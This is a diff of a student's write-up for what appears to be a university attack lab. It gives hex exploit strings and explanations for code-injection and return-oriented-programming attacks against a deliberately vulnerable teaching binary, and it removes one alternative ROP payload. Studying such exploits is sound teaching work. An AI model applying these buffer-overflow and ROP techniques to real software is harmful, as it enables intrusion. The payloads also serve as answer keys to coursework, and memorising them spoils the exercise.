@@ -16,7 +16,13 @@ phase 2
 f8 88 67 55 00 00 00 00
 7c 17 40 00 00 00 00 00
 
-For phase 2
+For phase 2, we still need 24 bytes of filler material, but we also to 
+pass the cookie to the code. Since the first argument to the function 
+touch2 will be in register rdi, we want to move our cookie to rdi. We do 
+this by writing the code movq $0x783cd2dd, %rdi followed by retq, which 
+when compiled gives us the first line. Now we pad with 16 bytes more to 
+reach the desired 24 bytes. Next we put in the address of rsp and the 
+address of the touch2 function. 
 
 phase 3
 -------------------------------------------------------------------------
@@ -26,6 +32,13 @@ phase 3
 f8 88 67 55 00 00 00 00
 50 18 40 00 00 00 00 00
 37 38 33 63 64 32 64 64 00
+
+For phase 3, we start by putting rsp+0x28 into register rdi by writing 
+the assembly code to do so and using the gcc compiler to do so. We want
+to put the cookie after the touch3 so it is not overwritten. Then we add
+the remaining 16 bytes of padding followed by the address of rsp. Now we 
+give the address of of touch3. Last, we put the cookie as a string, using 
+the ascii conversion table, followed by a null byte to indicate the end. 
 
 phase 4
 -------------------------------------------------------------------------
@@ -37,7 +50,7 @@ dd d2 3c 78 00 00 00 00
 ec 18 40 00 00 00 00 00
 7c 17 40 00 00 00 00 00
 
-24 (0x18) bytes of filler material. 4018e1 is the location of my gadget1, 
+24 bytes of filler material. 4018e1 is the location of my gadget1, 
 which does a popq %rax indicated by 58 and the return code c3. In my case,
 I could not find "58 c3" but I found "58 90 c3", which works since 90 is 
 the nop code and has no function. 4018ec is the location of my gadget2, 
@@ -60,6 +73,18 @@ ec 18 40 00 00 00 00 00
 50 18 40 00 00 00 00 00 
 37 38 33 63 64 32 64 64 
 
+We start with 24 bytes of filler material. Then we want to move %rsp into,
+%rax, which is given by the hex code 48 89 e0. We find this gadget in the
+code farm at the address 0x40191b. Next we want to move %rax into %rdi, to
+be the first input, which is given by the codes 48 89 c7 and found at
+0x4018ec. Next we pop %rax with the code 58 at 0x4018e1. We then put the 
+number 48 to buffer our optcodes. Now we try to move %eax to %esi, but those
+code to do exist in the code farm, so we use the 3 helper steps of %eax to 
+%edx, %edx to %ecx, and %ecx to %esi. Next we use the add_xy function at 
+0x401915 to perform an lea and then move %rax to %rdi with the code 48 89 c7 
+given at line 0x4018ec. Then we put in the address of touch3 and the cookie 
+as a string from phase 3. 
+
 24 bytes of filler material
 movq %rsp, %rax 48 89 e0 40191b
 movq %rax, %rdi 48 89 c7 4018ec
@@ -76,19 +101,3 @@ lea add_xy 401915 or 4019f7
 movq %rax, %rdi 48 89 c7 4018ec
 put address of touch 3 401850
 cookie as string 37 38 33 63 64 32 64 64
-
-   00 00 00 00 00 00 00 00
-    00 00 00 00 00 00 00 00
-    00 00 00 00 00 00 00 00 /* buffer */
-    e8 1a 40 00 00 00 00 00 /* step1: mov  %rsp, %rax */
-    2f 1a 40 00 00 00 00 00 /* step2: mov %rax, %rdi */
-    39 1a 40 00 00 00 00 00 /* step3: pop %rax */
-    48 00 00 00 00 00 00 00 /* step4: constant 0x48 */
-    a4 1a 40 00 00 00 00 00 /* step5: movl %eax, %edx */
-    fc 1a 40 00 00 00 00 00 /* step6: movl %edx, %ecx */
-    b3 1a 40 00 00 00 00 00 /* step7: movl %ecx, %esi */
-    68 1a 40 00 00 00 00 00 /* step8: lea (%rdi, %rsi, 1), %rax */
-    4a 1a 40 00 00 00 00 00 /* step9: mov %rax, %rdi */ 
-    8a 19 40 00 00 00 00 00 /* step10: touch3 address */
-    33 65 35 32 64 66 66 35 /* step11: string representtion of cookie */
-    00 00 00 00 00 00 00 00 
